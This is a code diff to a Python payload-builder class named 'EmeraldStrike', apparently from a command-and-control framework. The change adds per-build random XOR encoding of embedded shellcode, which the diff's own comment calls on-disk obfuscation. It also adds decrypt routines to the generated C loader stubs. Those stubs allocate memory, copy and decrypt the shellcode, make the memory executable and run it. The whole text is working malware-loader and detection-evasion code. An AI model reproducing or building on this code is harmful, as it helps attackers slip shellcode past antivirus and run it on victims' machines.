@@ -942,7 +942,13 @@ class EmeraldStrike(PayloadType):
 
     async def _wrap_in_pe(self, shellcode, output_type, arch, build_path, debug=False,
                           reloc_offsets=None):
-        sc_array = ", ".join(f"0x{b:02x}" for b in shellcode)
+        # XOR the shellcode for on-disk obfuscation. The wrapper stub
+        # decrypts after memcpy_ into the RW allocation, before flipping
+        # to RWX and jumping. This keeps the UDRL kit completely untouched
+        # — any template-compatible kit works without modification.
+        XOR_KEY = secrets.randbelow(254) + 1  # 1..254, nonzero, per-build random
+        sc_xored = bytes(b ^ XOR_KEY for b in shellcode)
+        sc_array = ", ".join(f"0x{b:02x}" for b in sc_xored)
 
         # x86 relocation table: applied by the loader stub after copying the
         # shellcode, because the compiler's absolute addresses are VMA-0 relative.
@@ -1072,6 +1078,10 @@ static void* memcpy_(void* dst, const void* src, u64_ n) {{
     while (n--) *d++ = *s++;
     return dst;
 }}
+
+static void xor_decrypt_(u8_* buf, u64_ len, u8_ key) {{
+    for (u64_ i = 0; i < len; i++) buf[i] ^= key;
+}}
 """
 
         if output_type == "dll":
@@ -1094,6 +1104,10 @@ static void* memcpy_(void* dst, const void* src, SIZE_T_ n) {{
     return dst;
 }}
 
+static void xor_decrypt_dll_(unsigned char* buf, SIZE_T_ len, unsigned char key) {{
+    for (SIZE_T_ i = 0; i < len; i++) buf[i] ^= key;
+}}
+
 static unsigned char shellcode[] = {{ {sc_array} }};
 {reloc_code}
 static const unsigned char build_pad[] = {{ {pad_array} }};
@@ -1104,6 +1118,7 @@ static void execute_shellcode(void) {{
                                (DWORD_)0x3000, (DWORD_)0x04);
     if (!mem) return;
     memcpy_(mem, shellcode, (SIZE_T_)sizeof(shellcode));
+    xor_decrypt_dll_((unsigned char*)mem, (SIZE_T_)sizeof(shellcode), (unsigned char){XOR_KEY});
     apply_relocations((unsigned char*)mem);
     DWORD_ old;
     VirtualProtect(mem, (SIZE_T_)sizeof(shellcode), (DWORD_){exec_prot}, &old);
@@ -1141,6 +1156,7 @@ void mainCRTStartup(void) {{
                               0x3000 /*MEM_COMMIT|MEM_RESERVE*/, 0x04 /*RW*/);
     if (!mem) return;
     memcpy_(mem, shellcode, (unsigned long long)sizeof(shellcode));
+    xor_decrypt_((u8_*)mem, (u64_)sizeof(shellcode), (u8_){XOR_KEY});
     // Bias the compiler's VMA-0 absolute addresses by the real load address.
     // No-op on x64 (RELOC_COUNT == 0).
     apply_relocations((unsigned char*)mem);
